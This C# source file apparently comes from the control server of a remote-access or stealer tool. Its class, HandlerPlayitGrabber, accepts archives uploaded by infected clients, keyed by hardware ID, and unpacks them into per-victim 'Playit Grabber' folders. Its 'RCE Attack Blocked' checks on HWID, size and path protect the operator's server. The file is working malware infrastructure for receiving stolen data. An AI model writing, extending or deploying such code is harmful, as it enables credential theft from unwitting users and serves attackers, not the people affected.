using System;
using System.Drawing;
using System.IO;
using System.Text.RegularExpressions;
using Server.Connectings;
using Server.Helper;

internal class HandlerPlayitGrabber
{
	public static void Read(Clients clients, object[] array)
	{
		if (clients == null || array == null || array.Length < 3)
		{
			clients?.Disconnect();
			return;
		}
		string ip = clients.IP;
		string hwid = clients.Hwid;
		if (!string.IsNullOrEmpty(hwid) && !Regex.IsMatch(hwid, "^[0-9a-fA-F]{32}$"))
		{
			Methods.AppendLogs(ip, "RCE Attack Blocked! Invalid HWID (PlayitGrabber)", Color.Red);
			clients.Disconnect();
			return;
		}
		string userId = array[1] as string;
		byte[] payload = array[2] as byte[];
		if (string.IsNullOrWhiteSpace(userId) || payload == null || payload.Length == 0)
		{
			clients.Disconnect();
			return;
		}
		string sanitizedUserId = SecurityHelper.SanitizeHwid(userId);
		if (sanitizedUserId == "InvalidHWID" || sanitizedUserId == "Unknown")
		{
			Methods.AppendLogs(ip, "RCE Attack Blocked! Invalid userId (PlayitGrabber)", Color.Red);
			clients.Disconnect();
			return;
		}
		if (payload.Length > 10485760)
		{
			Methods.AppendLogs(ip, "RCE Attack Blocked! Payload too large (PlayitGrabber)", Color.Red);
			clients.Disconnect();
			return;
		}
		string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Users");
		string userBasePath = Path.Combine(text, sanitizedUserId);
		if (!SecurityHelper.IsSafePath(text, sanitizedUserId))
		{
			Methods.AppendLogs(ip, "RCE Attack Blocked! Path Traversal (PlayitGrabber)", Color.Red);
			clients.Disconnect();
			return;
		}
		try
		{
			if (!Directory.Exists(userBasePath))
			{
				Directory.CreateDirectory(userBasePath);
			}
			PaleFileProtocol.Unpack(userBasePath, payload);
			Methods.AppendLogs(ip, "Playit Grabber: Saved to Users\\" + sanitizedUserId + "\\Playit Grabber", Color.MediumPurple);
		}
		catch (Exception ex)
		{
			Methods.AppendLogs(ip, "Playit Grabber error: " + ex.Message, Color.Red);
		}
		finally
		{
			clients.Disconnect();
		}
	}
}
